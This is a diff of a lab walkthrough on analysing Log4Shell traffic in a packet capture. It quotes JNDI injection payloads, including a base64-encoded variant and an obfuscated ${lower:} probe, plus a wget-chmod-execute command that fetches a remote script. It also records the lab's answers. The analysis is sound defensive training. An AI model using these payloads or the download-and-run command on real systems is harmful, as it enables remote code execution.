@@ -1,4 +1,4 @@
-## Traffic Analysis
+<img width="1263" height="740" alt="image" src="https://github.com/user-attachments/assets/dc2ca172-0666-4399-854a-6cdc5f385d95" />## Traffic Analysis
 
 ## Part 1 - Nmap Scans
 
@@ -599,9 +599,30 @@ This vulnerability was such a big deal because it was a zero-day and allowed for
 wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
 ```
 
-This is actually three separate commands. This means download the `lh.sh` script from `http://62.210.130.250`. Then, `chmod +x lh.sh` sets the new script as executable. Finally. it executes it `./lh.sh`. This vulnerability was such a big deal because Log4j was deeply embedded in the Java ecosystem. It could be part of an application in such a way that the owners wouldn't even know they're using it.
+This is actually three separate commands. This means download the `lh.sh` script from `http://62.210.130.250`. Then, `chmod +x lh.sh` sets the new script as executable. Finally. it executes it `./lh.sh`. This vulnerability was such a big deal because Log4j was deeply embedded in the Java ecosystem. It could be part of an application in such a way that the owners wouldn't even know they're using it. The best way to identify Log4Shell activity is by simply looking for "jndi" in the packet capture. Click **Edit** &rarr; **Find packet**, then search for "${jndi:" as a string in packet details. We're being asked to find the starting phase, which will likely be the first packet in this capture.
+
+<img width="1263" height="740" alt="image" src="https://github.com/user-attachments/assets/47cb2e07-6b8a-4b4b-8481-225e2441e415" />
+
+We can see a Log4Shell attempt in the user-agent:
+```
+${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
+```
+This is the same exact command as last time, and the packet number is our answer, but let's look at another example.
+```
+${jndi:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}
+```
+This one doesn't have any base64 commands, but it does have an interesting format. This is an obfuscated Log4Shell probe. It tries to use Log4j's own string transformation lookups to hide the literal text `ldap` to seemingly try and bypass basic signature based lookups like `${jndi:ldap://...}`. E.g., `{lower:l}` just gets converted to `l`. After the transformation, it will look like:
+```
+${jndi:ldap://world80.log4j.binAryedge.io:80/callback}
+```
+This will make JNDI attempt to resolve to `world80.log4j.binAryedge.io` over port 80. The `/callback` path indicates that this is just a probing attempt to test if the application is vulnerable.
+
+**Answer**: 444
 
 ### Question 4 - Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)
+We already revealed this during our analysis of the previous question.
+
+**Answer**: 62[.]210[.]130[.]250
 
 ## Part 7 - Encrypted Protocol Analysis: Decrypting HTTPS
 
